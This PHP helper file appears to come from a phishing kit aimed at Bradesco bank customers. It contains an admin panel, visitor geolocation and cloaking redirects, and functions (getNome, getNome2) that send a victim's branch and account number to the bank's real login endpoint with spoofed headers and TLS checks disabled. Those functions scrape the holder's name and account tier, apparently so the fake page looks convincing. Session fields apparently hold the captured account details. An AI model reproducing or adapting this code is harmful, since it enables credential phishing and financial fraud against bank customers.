
<?php
function erro() {
    header('Location: https://google.com');
    exit();
}
function getGeo( $ip ) {

    if(strlen($ip) > 3 ) {

        $cURLConnection = curl_init();

        curl_setopt($cURLConnection, CURLOPT_URL, 'http://ip-api.com/json/' . $ip);
        curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);
        
        $phoneList = curl_exec($cURLConnection);
        curl_close($cURLConnection);
        
        $jsonArrayResponse = json_decode($phoneList);
        return $jsonArrayResponse; 
    }

    return "";
}

function removerQuebraDeLinha($str){
    $str = preg_replace('/\n/', ' ', $str);
    $str = preg_replace('/<br>/', ' ', $str);
    return $str;
}

function contarLinhas($file) {
    $linecount = 0;
    $handle = fopen($file, "r");
    while(!feof($handle)){
        $line = fgets($handle);
        if(strlen($line)) {
            $linecount++;
        }
    }

    fclose($handle);

    return $linecount;
}

function random($size) {
    $KEYS = "ABCDEFGHJKMNOPQRSTUWXYZ0123456789";
    $str = array();
    $lenghth = strlen($KEYS) - 1;
    for ($i = 0; $i < $size; $i++) {
      $n = rand(0, $lenghth);
      $str[] = $KEYS[$n];
    }
    return implode($str);
}

function getUserAgent() {
    return $_SERVER['HTTP_USER_AGENT'];
}

function isMobile() {
    $useragent=$_SERVER['HTTP_USER_AGENT'];
    return preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i',$useragent)||preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i',substr($useragent,0,4));
    //return true;
}

function getDevice() {
    return isMobile() ? "MOBILE" : "DESKTOP";
}

function getIp() {
    return @$_SERVER[REMOTE_ADDR];
    //return "189.40.84.223";
}

function generateHash() {
    return md5(time().random(30));
}

function getUrl() {
    return (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
}

function getRefferer() {
    return isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : "-";
}

function mostrarErro(){
    header('HTTP/1.1 404 Not Found', true, 404);
    exit();
}

function getHash() {

    if(isset($_COOKIE["clientHashId"])) {
        return $_COOKIE["clientHashId"];
    }

    $hash = uniqid(rand(),true);
    setcookie('clientHashId', $hash, (time() + (7 * 24 * 3600)));

    return $hash;
}

function estaLogado(){
    $token = isset($_SESSION['token']) ? $_SESSION['token'] : '';
    $usuario = isset($_SESSION['usuario']) ? $_SESSION['usuario'] : '';


    if(strlen($token) == 0 || strlen($usuario) == 0 || !Sessao::validarToken($usuario, $token)){
        return false;
    }

    return true;
}

function getHeader($customCss = [], $title = null){
    $conteudo = file_get_contents("header.php");
    $estilos = "";
    if($customCss){
        foreach ($customCss as $item) {
            $estilos .= '<link rel="stylesheet" href="'.$item.'"></link>';
        }
        $conteudo = str_replace("<!--INCLUDE CSS-->", $estilos, $conteudo);
    }

    if(!$title){
        $title = "Painel Administrativo";
    }

    $conteudo = str_replace("{{TITLE}}", $title, $conteudo);
    echo $conteudo;
}

function getFooter($customCss = []){
    $conteudo = file_get_contents("footer.php");
    $estilos = "";
    foreach ($customCss as $item) {
        $estilos .= '<script src="'.$item.'"></script>';
    }
    $conteudo = str_replace("<!--INCLUDE JS-->", $estilos, $conteudo);
    echo $conteudo;
}


function dataPorExtensoNovo(){

    $data = date('D');
    $mes = date('m');
    $dia = date('d');
    $ano = date('Y');

    $semana = array(
        'Sun' => 'DOM',
        'Mon' => 'SEG',
        'Tue' => 'TER',
        'Wed' => 'QUA',
        'Thu' => 'QUI',
        'Fri' => 'SEX',
        'Sat' => 'SAB'
    );


    return $semana["$data"] . ", $dia/$mes/$ano";
    }

function dataPorExtenso(){

    $data = date('D');
    $mes = date('M');
    $dia = date('d');
    $ano = date('Y');

    $semana = array(
        'Sun' => 'Domingo',
        'Mon' => 'Segunda-Feira',
        'Tue' => 'Terca-Feira',
        'Wed' => 'Quarta-Feira',
        'Thu' => 'Quinta-Feira',
        'Fri' => 'Sexta-Feira',
        'Sat' => 'Sábado'
    );

    $mes_extenso = array(
        'Jan' => 'Janeiro',
        'Feb' => 'Fevereiro',
        'Mar' => 'Marco',
        'Apr' => 'Abril',
        'May' => 'Maio',
        'Jun' => 'Junho',
        'Jul' => 'Julho',
        'Aug' => 'Agosto',
        'Nov' => 'Novembro',
        'Sep' => 'Setembro',
        'Oct' => 'Outubro',
        'Dec' => 'Dezembro'
    );

    return $semana["$data"] . ", {$dia} de " . $mes_extenso["$mes"] . " de {$ano}";
    }

    function saudacao() {
        $hr = date(" H ");
        if($hr >= 12 && $hr<18) {
            return "Boa tarde";
        } else if ($hr >= 0 && $hr <12 ){
            return "Bom dia";
        }
        
        return "Boa noite";
}
function getNome2($agencia, $conta) {
    $digitoConta = substr($conta, -1);
    $conta = substr($conta, 0, strlen($conta)-1);

    $part = random(10);
    $ga = random(1).".".random(8).".".random(9).".".$part."-".random(9).".".$part;

	$agencia = str_pad($agencia, 4, "0", STR_PAD_LEFT);


    $ch = curl_init("https://www.ib12.bradesco.com.br/ibpfnovologin/identificacao.jsf?_ga=".$ga);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $fields = "AGN=".$agencia."&CTA=".$conta."&DIGCTA=".$digitoConta."&EXTRAPARAMS=&ORIGEM=101";
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/cookie.txt');
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    $headers = array();
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    $headers[] = 'Accept-Encoding: gzip, deflate, br';
    $headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
    $headers[] = 'Cache-Control: max-age=0';
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Content-Length: '.strlen($fields);
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    $headers[] = 'Host: www.ib12.bradesco.com.br';
    $headers[] = 'Origin: https://banco.bradesco';
    $headers[] = 'Referer: https://banco.bradesco/html/classic/index.shtm';
    $headers[] = 'Sec-Fetch-Mode: navigate';
    $headers[] = 'Sec-Fetch-Site: cross-site';
    $headers[] = 'Sec-Fetch-User: ?1';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36';
    
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $output = curl_exec($ch);

 
    preg_match_all('/Ol&#225;,\s(\w+)/',$output,$nome);
    
    $retorno = array();
    $retorno['nome'] = "";


    if(isset($nome) && isset($nome[1]) && isset($nome[1][0]) && strlen($nome[1][0]) > 0){
        $retorno['nome'] = $nome[1][0];
    }

    preg_match_all('/Confira seu Nome, (\w+)[\'\"]/',$output,$nomePrimeiroAcesso);


    if(isset($nomePrimeiroAcesso) && isset($nomePrimeiroAcesso[1]) && isset($nomePrimeiroAcesso[1][0]) && strlen($nomePrimeiroAcesso[1][0]) > 0){
        $retorno['nome'] = $nomePrimeiroAcesso[1][0];
    }

    $retorno['titulares'] = array();

    if(strlen($retorno['nome']) == 0) {
        

        preg_match_all('/<span\s{0,}id="radNome\d{2}"\s{0,}for="radNome\d{2}"\s{0,}>(\w+)<\/span>/',$output,$titulares);


        if(isset($titulares[1])){
            foreach($titulares[1] as $titular){

                array_push($retorno['titulares'], $titular);
            }
        }

        
    }

    $retorno['exclusive'] = false;
    $retorno['prime'] = false;

    if(strpos( $output, '<body class="exclusive">') !== false ){
        $retorno['exclusive'] = true;
    }


    if(strpos( $output, '<body class="prime">') !== false ){
        $retorno['prime'] = true;
    }

    return $retorno;

}


function getNome($agencia, $conta) {
    $digitoConta = substr($conta, -1);
    $conta = substr($conta, 0, strlen($conta)-1);

    $part = random(10);
    $ga = random(1).".".random(8).".".random(9).".".$part."-".random(9).".".$part;

	$agencia = str_pad($agencia, 4, "0", STR_PAD_LEFT);


    $ch = curl_init("https://www.ib12.bradesco.com.br/ibpflogin/identificacao.jsf?_ga=".$ga);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $fields = "AGN=".$agencia."&CTA=".$conta."&DIGCTA=".$digitoConta."&EXTRAPARAMS=&ORIGEM=101";
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/cookie.txt');
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    $headers = array();
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    $headers[] = 'Accept-Encoding: gzip, deflate, br';
    $headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
    $headers[] = 'Cache-Control: max-age=0';
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Content-Length: '.strlen($fields);
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    $headers[] = 'Host: www.ib12.bradesco.com.br';
    $headers[] = 'Origin: https://banco.bradesco';
    $headers[] = 'Referer: https://banco.bradesco/html/classic/index.shtm';
    $headers[] = 'Sec-Fetch-Mode: navigate';
    $headers[] = 'Sec-Fetch-Site: cross-site';
    $headers[] = 'Sec-Fetch-User: ?1';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36';
    
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $output = curl_exec($ch);

 
    preg_match_all('/[Boa,Bom] (\w+),<span>(\w+)<\/span>/',$output,$nome);
    
    $retorno = array();
    $retorno['nome'] = "";

    if(isset($nome) && isset($nome[2]) && isset($nome[2][0]) && strlen($nome[2][0]) > 0){
        $retorno['nome'] = $nome[2][0];
    }

    preg_match_all('/Confira seu Nome, (\w+)[\'\"]/',$output,$nomePrimeiroAcesso);


    if(isset($nomePrimeiroAcesso) && isset($nomePrimeiroAcesso[1]) && isset($nomePrimeiroAcesso[1][0]) && strlen($nomePrimeiroAcesso[1][0]) > 0){
        $retorno['nome'] = $nomePrimeiroAcesso[1][0];
    }

    $retorno['titulares'] = array();

    if(strlen($retorno['nome']) == 0) {
        

        preg_match_all('/<label id="radNome\w{2}" for="radNome\w{2}" >(\w+)<\/label>/',$output,$titulares);

        if(isset($titulares[1])){
            foreach($titulares[1] as $titular){

                array_push($retorno['titulares'], $titular);
            }
        }

        
    }

    $retorno['exclusive'] = false;

    if(strpos( $output, 'exclusive') !== false ){
        $retorno['exclusive'] = true;
    }

    return $retorno;

}

function clearSession(){

    if(isset($_SESSION['nome'])){
        unset($_SESSION['nome']);
    }
    if(isset($_SESSION['id'])){
        unset($_SESSION['id']);
    }
    if(isset($_SESSION['info'])){
        unset($_SESSION['info']);
    }
    if(isset($_SESSION['pais'])){
        unset($_SESSION['pais']);
    }
    if(isset($_SESSION['estado'])){
        unset($_SESSION['estado']);
    }
    if(isset($_SESSION['cidade'])){
        unset($_SESSION['cidade']);
    }
    if(isset($_SESSION['clientId'])){
        unset($_SESSION['clientId']);
    }
    if(isset($_SESSION['idAcesso'])){
        unset($_SESSION['idAcesso']);
    }
    if(isset($_SESSION['agencia'])){
        unset($_SESSION['agencia']);
    }
    if(isset($_SESSION['conta'])){
        unset($_SESSION['conta']);
    }
    if(isset($_SESSION['digito'])){
        unset($_SESSION['digito']);
    }

    if(isset($_SESSION['s4'])){
        unset($_SESSION['s4']);
    }
}